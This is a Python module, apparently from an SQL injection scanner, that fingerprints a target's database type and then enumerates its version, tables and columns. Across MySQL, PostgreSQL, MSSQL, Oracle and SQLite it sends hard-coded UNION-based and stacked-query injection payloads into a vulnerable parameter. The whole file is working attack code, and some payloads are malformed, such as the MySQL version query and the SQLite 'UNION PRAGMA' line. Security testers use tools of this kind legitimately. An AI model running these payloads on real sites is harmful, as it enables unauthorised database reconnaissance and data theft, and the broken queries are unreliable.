import time
import random
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.colors import Colors
from utils.logger import Logger

class DatabaseFingerprint:
    DB_SIGNATURES = {
        'MySQL': {
            'error_keywords': ['mysql', 'mysqli', 'mariadb', 'you have an error in your sql syntax'],
            'version_query': 'SELECT VERSION()',
            'version_patterns': [r'MariaDB', r'\d+\.\d+\.\d+-MySQL', r'\d+\.\d+\.\d+']
        },
        'PostgreSQL': {
            'error_keywords': ['postgresql', 'pg_', 'psql'],
            'version_query': 'SELECT version()',
            'version_patterns': [r'PostgreSQL \d+\.\d+', r'PostgreSQL']
        },
        'MSSQL': {
            'error_keywords': ['microsoft sql server', 'mssql', 'sql server', 'incorrect syntax'],
            'version_query': 'SELECT @@VERSION',
            'version_patterns': [r'Microsoft SQL Server \d+', r'SQL Server \d+']
        },
        'Oracle': {
            'error_keywords': ['oracle', 'ora-', 'oracle database'],
            'version_query': 'SELECT * FROM v$version',
            'version_patterns': [r'Oracle Database', r'Oracle\d+', r'ORA-\d+']
        },
        'SQLite': {
            'error_keywords': ['sqlite', 'sqlite3', 'sqlite_error'],
            'version_query': 'SELECT sqlite_version()',
            'version_patterns': [r'SQLite version', r'\d+\.\d+\.\d+']
        }
    }
    
    def __init__(self, http_client, options=None):
        self.http = http_client
        self.options = options or {}
        self.logger = Logger()
    
    def fingerprint(self, url, param, baseline_response):
        db_type = self._detect_from_error(baseline_response.text)
        if db_type:
            return {'type': db_type, 'method': 'error_message'}
        
        db_type = self._detect_from_behavior(url, param)
        if db_type:
            return {'type': db_type, 'method': 'behavior'}
        
        return {'type': 'Unknown', 'method': 'none'}
    
    def _detect_from_error(self, error_text):
        error_lower = error_text.lower()
        
        for db_type, signatures in self.DB_SIGNATURES.items():
            for keyword in signatures['error_keywords']:
                if keyword in error_lower:
                    return db_type
        
        return None
    
    def _detect_from_behavior(self, url, param):
        test_payloads = {
            'MySQL': "' AND 1=1--+",
            'PostgreSQL': "' AND 1=1--",
            'MSSQL': "' AND 1=1--",
            'Oracle': "' AND 1=1--",
            'SQLite': "' AND 1=1--"
        }
        
        for db_type, test_payload in test_payloads.items():
            response = self.http.test_payload(url, param, test_payload, technique='append')
            
            if response.success and response.status_code == 200:
                return db_type
        
        return None
    
    def get_version(self, url, param, db_type):
        version_queries = {
            'MySQL': ["' AND (SELECT) FROM (SELECT SLEEP(0)) WHERE 1=1--"],
            'PostgreSQL': ["' || (SELECT version())--"],
            'MSSQL': ["'; SELECT @@VERSION--"],
            'Oracle': ["' UNION SELECT NULL FROM v$version--"],
            'SQLite': ["' UNION SELECT sqlite_version()--"]
        }
        
        payloads = version_queries.get(db_type, [])
        
        for payload in payloads:
            response = self.http.test_payload(url, param, payload, technique='append')
            if response.success:
                return response.text[:500]
        
        return None
    
    def enumerate_tables(self, url, param, db_type, limit=10):
        table_queries = {
            'MySQL': [
                "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--",
                "' UNION SELECT table_name FROM information_schema.tables LIMIT 0,1--"
            ],
            'PostgreSQL': [
                "' UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0--",
                "'; SELECT tablename FROM pg_tables LIMIT 1 OFFSET 0--"
            ],
            'MSSQL': [
                "'; SELECT TOP 1 table_name FROM information_schema.tables--",
                "'; SELECT name FROM sysobjects WHERE xtype='U'--"
            ],
            'Oracle': [
                "' UNION SELECT table_name FROM user_tables WHERE ROWNUM <= 1--"
            ],
            'SQLite': [
                "' UNION SELECT name FROM sqlite_master WHERE type='table' LIMIT 1--"
            ]
        }
        
        payloads = table_queries.get(db_type, [])
        
        for payload in payloads:
            response = self.http.test_payload(url, param, payload, technique='append')
            if response.success and response.status_code != 500:
                return response.text[:1000]
        
        return None
    
    def enumerate_columns(self, url, param, db_type, table, limit=20):
        column_queries = {
            'MySQL': [
                f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT 0,1--"
            ],
            'PostgreSQL': [
                f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT 1 OFFSET 0--"
            ],
            'MSSQL': [
                f"'; SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='{table}'--"
            ],
            'Oracle': [
                f"' UNION SELECT column_name FROM user_tab_columns WHERE table_name='{table}'--"
            ],
            'SQLite': [
                f"' UNION PRAGMA table_info('{table}')--"
            ]
        }
        
        payloads = column_queries.get(db_type, [])
        
        for payload in payloads:
            response = self.http.test_payload(url, param, payload, technique='append')
            if response.success and response.status_code != 500:
                return response.text[:2000]
        
        return None
